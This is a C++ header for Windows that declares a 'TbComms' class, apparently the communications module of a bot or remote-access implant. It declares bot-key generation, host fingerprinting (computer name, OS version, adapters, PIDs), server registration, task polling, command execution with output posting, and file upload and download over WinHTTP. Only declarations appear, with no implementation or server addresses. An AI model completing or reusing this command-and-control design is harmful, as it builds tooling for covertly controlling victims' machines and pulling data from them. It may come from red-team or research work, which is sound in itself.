#pragma once
#pragma warning(disable : 4996)
#pragma warning(disable : 4703)
#include <winsock2.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include "atlstr.h"
#include "winhttp.h"
#include <tlhelp32.h>
#include <vector>
#include <fstream>
#include <iostream>

#include "Commands.h"

#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "winhttp.lib")

#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

//#ifdef  TBCOMMS_EXPORTS
//#define TB_API _declspec(dllexport)
//#else
//#define TB_API _declspec(dllimport)
//#endif //  TBCOMMS_EXPORTS
//
using namespace std;

class TbComms
{
private:

public:
	PIP_ADAPTER_INFO ipInterface = NULL;
	static const int BUFSIZE = 1024;
	static const int SHA256LEN = 64;
	static const int SHA256_ASCII_LEN = SHA256LEN * 2 + 1;
	std::string guid = "";

	TbComms();
	~TbComms();
	PIP_ADAPTER_INFO getInterface();
	int genBotKey(BYTE*, DWORD, char[]);
	string getBotKey(PIP_ADAPTER_INFO);
	string getComputerName();
	string getOsVersion();
	string genRandomString(const int);
	void setGuid();
	string getGuid();
	string getClientId();
	string genRegistrationRequest();
	string genGetTaskRequest();
	string getCWD();
	string getPID();
	string getPPID();
	string genPostCmdOutputRequest();
	string genDownloadFileRequest(string);
	string genUploadFileRequest(string);
	string executeCommand(string);
	void writeFile(string, LPSTR);
	LPSTR sendGet(string, string, string);
	void sendGetFile(string, string, string, string);
	LPSTR sendPost(string, string, string, string, bool);
};
